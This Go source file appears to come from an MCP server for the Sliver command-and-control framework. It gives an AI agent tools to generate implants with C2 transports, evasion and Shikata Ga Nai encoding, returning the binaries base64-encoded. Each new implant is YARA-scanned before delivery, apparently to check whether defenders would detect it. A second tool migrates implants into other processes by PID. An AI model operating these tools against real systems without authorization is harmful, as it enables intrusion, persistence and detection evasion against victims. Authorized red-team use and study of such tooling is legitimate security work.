package mcp

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	mcpapi "github.com/mark3labs/mcp-go/mcp"
)

const (
	generateToolName = "generate"
	migrateToolName  = "migrate"
)

// --- Generate Implant ---

type generateArgs struct {
	// Identity
	Name string `json:"name,omitempty"` // Implant name (auto-generated if empty)

	// Target platform
	GOOS   string `json:"goos,omitempty"`   // e.g. "windows", "linux", "darwin"
	GOARCH string `json:"goarch,omitempty"` // e.g. "amd64", "arm64"

	// Output format: "executable", "shared_lib", "shellcode"
	Format string `json:"format,omitempty"`

	// C2 transports — at least one must be true
	IncludeMTLS bool `json:"include_mtls,omitempty"`
	IncludeHTTP bool `json:"include_http,omitempty"`
	IncludeWG   bool `json:"include_wg,omitempty"`
	IncludeDNS  bool `json:"include_dns,omitempty"`

	// C2 endpoints (for HTTP/DNS) — e.g. ["https://10.0.0.1:443", "https://c2.example.com"]
	C2 []string `json:"c2,omitempty"`

	// Beacon mode
	IsBeacon       bool  `json:"is_beacon,omitempty"`
	BeaconInterval int64 `json:"beacon_interval,omitempty"` // seconds
	BeaconJitter   int64 `json:"beacon_jitter,omitempty"`   // seconds

	// Evasion
	Evasion          bool   `json:"evasion,omitempty"`
	ObfuscateSymbols bool   `json:"obfuscate_symbols,omitempty"`
	SGNEnabled       bool   `json:"sgn_enabled,omitempty"` // Shikata Ga Nai
	TemplateName     string `json:"template_name,omitempty"`

	// HTTP C2 profile
	HTTPC2ConfigName string `json:"http_c2_config_name,omitempty"`

	// Canaries
	CanaryDomains []string `json:"canary_domains,omitempty"`

	// Debug
	Debug bool `json:"debug,omitempty"`

	// WireGuard specific
	WGPeerTunIP       string `json:"wg_peer_tun_ip,omitempty"`
	WGKeyExchangePort uint32 `json:"wg_key_exchange_port,omitempty"`
	WGTcpCommsPort    uint32 `json:"wg_tcp_comms_port,omitempty"`

	// Limits
	LimitDomainJoined bool   `json:"limit_domain_joined,omitempty"`
	LimitHostname     string `json:"limit_hostname,omitempty"`
	LimitUsername     string `json:"limit_username,omitempty"`
	LimitLocale       string `json:"limit_locale,omitempty"`

	// Misc
	ReconnectInterval   int64  `json:"reconnect_interval,omitempty"`
	MaxConnectionErrors uint32 `json:"max_connection_errors,omitempty"`
	ConnectionStrategy  string `json:"connection_strategy,omitempty"` // "random" or "sequential"

	// Detection gate: auto-scan the generated binary against cached YARA rules
	// (elastic/protections-artifacts) before delivery. Skipped when the yara
	// binary or the ruleset is unavailable — see result notes.
	SkipYaraScan bool `json:"skip_yara_scan,omitempty"`
}

type generateResult struct {
	ImplantName    string          `json:"implant_name"`
	ImplantBuildID string          `json:"implant_build_id"`
	BinaryBase64   string          `json:"binary_base64"`
	BinarySize     int             `json:"binary_size"`
	YaraScan       *yaraScanResult `json:"yara_scan,omitempty"`
}

func (s *SliverMCPServer) generateHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
	var args generateArgs
	if err := request.BindArguments(&args); err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("invalid arguments: %v", err)), nil
	}

	// At least one transport must be specified
	if !args.IncludeMTLS && !args.IncludeHTTP && !args.IncludeWG && !args.IncludeDNS {
		return mcpapi.NewToolResultError("at least one C2 transport must be enabled (include_mtls, include_http, include_wg, or include_dns)"), nil
	}

	if s.Rpc == nil {
		return mcpapi.NewToolResultError("rpc client not configured"), nil
	}

	s.logToolCall(generateToolName, "", "",
		fmt.Sprintf("name=%q", args.Name),
		fmt.Sprintf("goos=%q goarch=%q", args.GOOS, args.GOARCH),
		fmt.Sprintf("mtls=%t http=%t wg=%t dns=%t", args.IncludeMTLS, args.IncludeHTTP, args.IncludeWG, args.IncludeDNS),
	)

	// Build C2 list
	c2List := make([]*clientpb.ImplantC2, 0, len(args.C2))
	for i, url := range args.C2 {
		c2List = append(c2List, &clientpb.ImplantC2{
			Priority: uint32(i),
			URL:      url,
		})
	}

	// Build ImplantConfig
	config := &clientpb.ImplantConfig{
		GOOS:                args.GOOS,
		GOARCH:              args.GOARCH,
		IsBeacon:            args.IsBeacon,
		BeaconInterval:      args.BeaconInterval,
		BeaconJitter:        args.BeaconJitter,
		Evasion:             args.Evasion,
		ObfuscateSymbols:    args.ObfuscateSymbols,
		SGNEnabled:          args.SGNEnabled,
		TemplateName:        args.TemplateName,
		IncludeMTLS:         args.IncludeMTLS,
		IncludeHTTP:         args.IncludeHTTP,
		IncludeWG:           args.IncludeWG,
		IncludeDNS:          args.IncludeDNS,
		C2:                  c2List,
		CanaryDomains:       args.CanaryDomains,
		HTTPC2ConfigName:    args.HTTPC2ConfigName,
		WGPeerTunIP:         args.WGPeerTunIP,
		WGKeyExchangePort:   args.WGKeyExchangePort,
		WGTcpCommsPort:      args.WGTcpCommsPort,
		LimitDomainJoined:   args.LimitDomainJoined,
		LimitHostname:       args.LimitHostname,
		LimitUsername:       args.LimitUsername,
		LimitLocale:         args.LimitLocale,
		ReconnectInterval:   args.ReconnectInterval,
		MaxConnectionErrors: args.MaxConnectionErrors,
		ConnectionStrategy:  args.ConnectionStrategy,
		Debug:               args.Debug,
	}

	// Map format string to enum
	switch args.Format {
	case "shared_lib", "":
		config.Format = clientpb.OutputFormat_SHARED_LIB
	case "shellcode":
		config.Format = clientpb.OutputFormat_SHELLCODE
		config.IsShellcode = true
	case "executable":
		config.Format = clientpb.OutputFormat_EXECUTABLE
	default:
		config.Format = clientpb.OutputFormat_EXECUTABLE
	}

	if args.Format == "shared_lib" {
		config.IsSharedLib = true
	}

	// Generate
	genResp, err := s.Rpc.Generate(ctx, &clientpb.GenerateReq{
		Config: config,
		Name:   args.Name,
	})
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to generate implant", err), nil
	}

	if genResp.File == nil {
		return mcpapi.NewToolResultError("generation succeeded but no binary returned"), nil
	}

	// Detection gate: scan the fresh binary against cached YARA rules before
	// handing it to the operator. Never blocks delivery — tooling gaps are
	// reported as notes.
	result := generateResult{
		ImplantName:    genResp.ImplantName,
		ImplantBuildID: genResp.ImplantBuildID,
		BinaryBase64:   base64.StdEncoding.EncodeToString(genResp.File.Data),
		BinarySize:     len(genResp.File.Data),
	}
	if !args.SkipYaraScan {
		if scanRes := scanGeneratedBinary(genResp.File.Data); scanRes != nil {
			result.YaraScan = scanRes
		}
	}

	return mcpapi.NewToolResultStructuredOnly(result), nil
}

// scanGeneratedBinary writes data to a temp file, YARA-scans it against the
// default ruleset, and removes the temp file. Returns nil when scanning is
// entirely unavailable (no yara binary AND no cached rules).
func scanGeneratedBinary(data []byte) *yaraScanResult {
	tmpFile, err := os.CreateTemp("", "sliver-implant-*.bin")
	if err != nil {
		return nil
	}
	tmpPath := tmpFile.Name()
	defer os.Remove(tmpPath)
	if _, err := tmpFile.Write(data); err != nil {
		tmpFile.Close()
		return nil
	}
	tmpFile.Close()

	res, err := YaraScanFile(tmpPath, elasticRulesDir, false)
	if err != nil {
		return nil
	}
	// Redact the temp path — operators see the implant name, not server paths
	res.File = "<generated implant>"
	return res
}

// --- Migrate ---

type migrateArgs struct {
	SessionID string `json:"session_id,omitempty"`
	BeaconID  string `json:"beacon_id,omitempty"`
	Pid       uint32 `json:"pid"`                 // Target process to migrate into
	ProcName  string `json:"proc_name,omitempty"` // Process name for logging
	// Implant config for the new implant (optional — reuses current config if empty)
	GOOS           string `json:"goos,omitempty"`
	GOARCH         string `json:"goarch,omitempty"`
	IncludeMTLS    bool   `json:"include_mtls,omitempty"`
	IncludeHTTP    bool   `json:"include_http,omitempty"`
	IncludeWG      bool   `json:"include_wg,omitempty"`
	IncludeDNS     bool   `json:"include_dns,omitempty"`
	Evasion        bool   `json:"evasion,omitempty"`
	Wait           bool   `json:"wait,omitempty"`
	TimeoutSeconds int64  `json:"timeout_seconds,omitempty"`
}

type migrateResult struct {
	Success bool   `json:"success"`
	Pid     uint32 `json:"pid"`
}

func (s *SliverMCPServer) migrateHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
	var args migrateArgs
	if err := request.BindArguments(&args); err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("invalid arguments: %v", err)), nil
	}
	if args.Pid == 0 {
		return mcpapi.NewToolResultError("pid is required"), nil
	}

	if s.Rpc == nil {
		return mcpapi.NewToolResultError("rpc client not configured"), nil
	}

	s.logToolCall(migrateToolName, args.SessionID, args.BeaconID,
		fmt.Sprintf("pid=%d", args.Pid),
	)

	args.TimeoutSeconds = applyDefaultTimeout(args.Wait, args.TimeoutSeconds)
	ctx, cancel := withTimeout(ctx, args.TimeoutSeconds)
	if cancel != nil {
		defer cancel()
	}

	req, _, err := buildRequest(args.SessionID, args.BeaconID, args.TimeoutSeconds)
	if err != nil {
		return mcpapi.NewToolResultError(err.Error()), nil
	}

	// Build minimal config for the migrated implant
	config := &clientpb.ImplantConfig{
		GOOS:        args.GOOS,
		GOARCH:      args.GOARCH,
		IncludeMTLS: args.IncludeMTLS,
		IncludeHTTP: args.IncludeHTTP,
		IncludeWG:   args.IncludeWG,
		IncludeDNS:  args.IncludeDNS,
		Evasion:     args.Evasion,
	}

	migResp, err := s.Rpc.Migrate(ctx, &clientpb.MigrateReq{
		Pid:      args.Pid,
		Config:   config,
		ProcName: args.ProcName,
		Request:  req,
	})
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to migrate", err), nil
	}

	if migResp.Response != nil && migResp.Response.Err != "" {
		return mcpapi.NewToolResultError(migResp.Response.Err), nil
	}

	return mcpapi.NewToolResultStructuredOnly(migrateResult{
		Success: migResp.Success,
		Pid:     migResp.Pid,
	}), nil
}
